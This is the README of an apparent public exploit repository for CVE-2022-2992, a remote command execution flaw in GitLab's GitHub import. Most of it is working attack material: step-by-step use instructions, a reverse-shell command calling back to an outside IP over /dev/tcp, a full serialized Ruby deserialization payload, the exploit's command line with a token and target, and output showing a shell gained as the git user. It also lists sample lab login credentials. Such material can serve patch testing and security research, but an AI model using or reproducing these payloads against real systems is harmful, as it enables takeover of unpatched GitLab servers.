# CVE-2022-2992
Authenticated Remote Command Execution in Gitlab via GitHub import.
> A vulnerability in GitLab CE/EE affecting all versions from 11.10 before 15.1.6, all versions starting from 15.2 before 15.2.4, all versions starting from 15.3 before 15.3.2. allows an authenticated user to achieve remote code execution via the Import from GitHub API endpoint.

https://about.gitlab.com/releases/2022/08/30/critical-security-release-gitlab-15-3-2-released/#remote-command-execution-via-github-import 

## Prerequisites
- [Ngrok](https://ngrok.com/)
- Ruby
- Redis
- Python3
- Flask
```
sudo apt install ruby python3 python3-pip
gem install redis 
pip install flask
```
---
## Steps
1) Run `./ngrok http 5000` and save the URL.
2) Now to generate the serialized payload run [payload_gen.rb](https://github.com/CsEnox/CVE-2022-2992/blob/main/payload_gen.rb) and save the payload. Below is an example:
```bash
ruby payload_gen.rb 'bash -c "sh -i >& /dev/tcp/172.16.128.129/443 0>&1"'
```
3) In [server.py](https://github.com/CsEnox/CVE-2022-2992/blob/main/server.py) update NGROK_URL and PAYLOAD variables accordingly. Below is an example:
```py
PAYLOAD = 'ggg\r\n*3\r\n$3\r\nset\r\n$19\r\nsession:gitlab:gggg\r\n$359\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\baaa\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\"8bash -c \"sh -i >& /dev/tcp/172.16.128.129/443 0>&1\"\u0006;\fT;\u0012:\fresolve'
NGROK_URL = 'https://dc09-41-01-99-69.in.ngrok.io'
```
4) Create an access token for the user on gitlab and select all scopes. Please read the documentation [here](https://docs.gitlab.com/ee/user/profile/personal_access_tokens.html)
5) Finally firing off our [exploit.py](https://github.com/CsEnox/CVE-2022-2992/blob/main/exploit.py).

**NOTE**: Before running make sure ngrok and flask server are running.
```py
python3 exploit.py -a lunpy-AMEuQE66KcUtNhcharjm5 -u https://dc09-41-01-99-69.in.ngrok.io -t http://gitlab.example
```
- We get a shell back on port 443
```bash
➜ CVE-2022-2992: nc -nlvp 443
listening on [any] 443 ...
connect to [172.16.128.129] from (UNKNOWN) [172.16.128.180] 40270
sh: 0: can't access tty; job control turned off
$ id
uid=998(git) gid=998(git) groups=998(git)
```

---
### Expected output in each window:
- Ngrok
```http
POST /vakzz/public.git/git-upload-pack 200 OK
GET  /vakzz/public.git/info/refs       200 OK
GET  /api/v3/repos/fake/name           200 OK
GET  /api/v3/repositories/12345        200 OK
GET  /api/v3/rate_limit                200 OK
GET  /api/v3/rate_limit                200 OK
```
- Exploit
```py
[1] Creating Group
[+] Successfully created group: qogjohpykk
[2] Running flask server
[3] Importing Github Repo
 * Serving Flask app "server" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
127.0.0.1 - - [08/Oct/2022 23:46:03] "GET /api/v3/rate_limit HTTP/1.1" 200 -
127.0.0.1 - - [08/Oct/2022 23:46:03] "GET /api/v3/rate_limit HTTP/1.1" 200 -
127.0.0.1 - - [08/Oct/2022 23:46:03] "GET /api/v3/repositories/12345 HTTP/1.1" 200 -
201
127.0.0.1 - - [08/Oct/2022 23:46:04] "GET /vakzz/public.git/info/refs?service=git-upload-pack HTTP/1.1" 200 -
127.0.0.1 - - [08/Oct/2022 23:46:04] "POST /vakzz/public.git/git-upload-pack HTTP/1.1" 200 -
127.0.0.1 - - [08/Oct/2022 23:46:04] "GET /api/v3/repos/fake/name HTTP/1.1" 200 -
[4] Triggering Payload
[+] Command was executed
```
---

## Environment
- Tested on Gitlab 15.3.1 Enterprise Edition
- For building your own environment for testing, copy the [data](https://github.com/CsEnox/CVE-2022-2992/tree/main/data) directory to `/` on your Linux VM.
- Run build.sh to setup the environment. Once the script finishes executing you can login using the following credentials on gitlab.
```
Username: enox
Email: enox@gitlab.example
Password: StrongestGitlabPassword
```
---

## Credits
- https://hackerone.com/reports/1679624 (vakzz)
- https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

If you have any questions reach out to me on [Discord](https://discord.com/) (Enox#4458)
